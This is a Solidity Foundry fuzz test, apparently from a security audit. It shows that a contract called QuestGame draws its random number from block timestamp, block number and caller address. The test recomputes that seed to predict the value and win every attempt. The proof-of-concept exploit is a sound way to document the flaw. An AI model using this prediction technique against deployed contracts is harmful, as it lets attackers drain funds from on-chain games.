
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame questGame;

    function setUp() public {
        questGame = new QuestGame{value: 10 ether}();
    }

    receive() external payable {}

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        vm.assume(blockTimestamp >= 1 hours); 
        vm.assume(blockNumber > 0);

        // --- 2. State Configuration ---
        
        vm.deal(address(this), 0.1 ether);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        // --- 3. Replication & Assertion ---
        
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp, 
                    block.number, 
                    address(this) 
                )
            )
        );

        uint256 predictedNumber = seed % 100;
                
        questGame.attemptQuest{value: 0.1 ether}(predictedNumber);

        (, uint256 wins) = questGame.getPlayerStats(address(this));
        assertEq(wins, 1, "Predictable RNG allowed a guaranteed win");
    }
}
